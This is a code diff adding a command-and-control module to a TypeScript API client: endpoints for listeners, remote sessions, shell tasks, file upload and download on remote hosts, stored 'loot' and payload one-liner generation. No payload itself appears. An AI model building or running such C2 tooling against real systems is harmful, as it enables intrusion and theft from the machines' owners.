@@ -73,6 +73,17 @@ import type {
   PromptVar,
   PromptVersion,
   ProxyCheckRun,
+  C2Listener,
+  C2ListenerInput,
+  C2Loot,
+  C2LootKind,
+  C2Overview,
+  C2Payload,
+  C2PayloadFormat,
+  C2PayloadTarget,
+  C2Session,
+  C2Task,
+  C2Transfer,
   TaskVpsEnvironment,
   VpsAssignment,
   VpsDashboard,
@@ -2167,4 +2178,96 @@ export const api = {
       machine: r.machine ?? null,
       executions: arr(r.executions),
     })),
+
+  // ── C2 中心（契约 C2_CONTRACTS.md;类型与路由以冻结版为准）──
+  c2Overview: () => get<C2Overview>("/c2/overview").then((r) => ({
+    ...r,
+    recent_sessions: arr(r.recent_sessions),
+    recent_tasks: arr(r.recent_tasks),
+  })),
+  // 监听器 CRUD + 启停。start/stop 返回运行时实际监听地址。
+  c2Listeners: () => get<{ listeners: C2Listener[]; total: number }>("/c2/listeners").then((r) => ({
+    listeners: arr(r.listeners),
+    total: r.total,
+  })),
+  c2Listener: (id: number) => get<C2Listener>(`/c2/listeners/${id}`),
+  c2CreateListener: (input: C2ListenerInput) => post<{ id: number }>("/c2/listeners", input),
+  c2UpdateListener: (id: number, input: Partial<C2ListenerInput>) => put<C2Listener>(`/c2/listeners/${id}`, input),
+  c2DeleteListener: (id: number) => del<{ deleted: boolean }>(`/c2/listeners/${id}`),
+  c2StartListener: (id: number) => post<{ addr: string }>(`/c2/listeners/${id}/start`),
+  c2StopListener: (id: number) => post<{ stopped: boolean }>(`/c2/listeners/${id}/stop`),
+  // 会话列表/详情/管控。companyId/taskId 传 0 = 不过滤。
+  c2Sessions: (input: { status?: string; listenerId?: number; taskId?: number; companyId?: number; q?: string; limit?: number; offset?: number }) => {
+    const p = new URLSearchParams();
+    if (input.status) p.set("status", input.status);
+    if (input.listenerId) p.set("listener_id", String(input.listenerId));
+    if (input.taskId) p.set("task_id", String(input.taskId));
+    if (input.companyId) p.set("company_id", String(input.companyId));
+    if (input.q) p.set("q", input.q);
+    p.set("limit", String(input.limit ?? 50));
+    p.set("offset", String(input.offset ?? 0));
+    return get<{ sessions: C2Session[]; total: number }>(`/c2/sessions?${p.toString()}`).then((r) => ({
+      sessions: arr(r.sessions),
+      total: r.total,
+    }));
+  },
+  c2Session: (id: number) => get<C2Session>(`/c2/sessions/${id}`),
+  c2KillSession: (id: number) => post<{ killed: boolean }>(`/c2/sessions/${id}/kill`),
+  c2SleepSession: (id: number, sleepSec: number, jitterPct: number) =>
+    post<{ ok: boolean }>(`/c2/sessions/${id}/sleep`, { sleep_sec: sleepSec, jitter_pct: jitterPct }),
+  c2BindSession: (id: number, taskId: number) => post<{ ok: boolean }>(`/c2/sessions/${id}/bind`, { task_id: taskId }),
+  // 会话任务:增量拉取(afterId=已见最大 id)+下发(shell/files_list/info)。
+  c2SessionTasks: (sessionId: number, afterId = 0, limit = 100) =>
+    get<{ tasks: C2Task[] }>(`/c2/sessions/${sessionId}/tasks?after_id=${afterId}&limit=${limit}`).then((r) => ({
+      tasks: arr(r.tasks),
+    })),
+  c2CreateTask: (sessionId: number, kind: "shell" | "files_list" | "info", input = "") =>
+    post<{ id: number }>(`/c2/sessions/${sessionId}/tasks`, { kind, input }),
+  c2TaskOutput: (id: number) => httpText(`/c2/tasks/${id}/output`),
+  // 文件:浏览(files_list 任务)、上传(multipart,勿传 JSON 头)、下载(建 transfer 轮询)。
+  c2FilesList: (sessionId: number, path: string) =>
+    post<{ task_id: number }>(`/c2/sessions/${sessionId}/files/list`, { path }),
+  c2UploadFile: (sessionId: number, file: File, remoteDir: string) => {
+    const fd = new FormData();
+    fd.append("file", file);
+    fd.append("path", remoteDir);
+    return post<{ transfer_id: number }>(`/c2/sessions/${sessionId}/files/upload`, fd);
+  },
+  c2DownloadFile: (sessionId: number, remotePath: string) =>
+    post<{ transfer_id: number }>(`/c2/sessions/${sessionId}/files/download`, { remote_path: remotePath }),
+  c2SessionTransfers: (sessionId: number, limit = 50) =>
+    get<{ transfers: C2Transfer[] }>(`/c2/sessions/${sessionId}/transfers?limit=${limit}`).then((r) => ({
+      transfers: arr(r.transfers),
+    })),
+  c2TransferDownloadUrl: (id: number) => `/api/c2/transfers/${id}/download`,
+  // 战利品。列表 content 恒空串;明文走详情接口。
+  c2Loot: (input: { kind?: string; sessionId?: number; q?: string; limit?: number; offset?: number }) => {
+    const p = new URLSearchParams();
+    if (input.kind) p.set("kind", input.kind);
+    if (input.sessionId) p.set("session_id", String(input.sessionId));
+    if (input.q) p.set("q", input.q);
+    p.set("limit", String(input.limit ?? 50));
+    p.set("offset", String(input.offset ?? 0));
+    return get<{ loot: C2Loot[]; total: number }>(`/c2/loot?${p.toString()}`).then((r) => ({
+      loot: arr(r.loot),
+      total: r.total,
+    }));
+  },
+  c2LootDetail: (id: number) => get<C2Loot>(`/c2/loot/${id}`),
+  c2CreateLoot: (input: { session_id: number; kind: C2LootKind; name: string; content: string; source_path?: string }) =>
+    post<{ id: number }>("/c2/loot", input),
+  c2DeleteLoot: (id: number) => del<{ deleted: boolean }>(`/c2/loot/${id}`),
+  // 载荷。生成时 callback 为空的监听器会被 400 拒绝(先去监听器页补回调地址)。
+  c2Payloads: (listenerId?: number) => {
+    const p = new URLSearchParams();
+    if (listenerId) p.set("listener_id", String(listenerId));
+    return get<{ payloads: C2Payload[]; total: number }>(`/c2/payloads?${p.toString()}`).then((r) => ({
+      payloads: arr(r.payloads),
+      total: r.total,
+    }));
+  },
+  c2GeneratePayload: (input: { listener_id: number; format: C2PayloadFormat; target?: C2PayloadTarget; name?: string }) =>
+    post<{ id: number; oneliner: string }>("/c2/payloads", input),
+  c2DeletePayload: (id: number) => del<{ deleted: boolean }>(`/c2/payloads/${id}`),
+  c2PayloadDownloadUrl: (id: number) => `/api/c2/payloads/${id}/download`,
 };
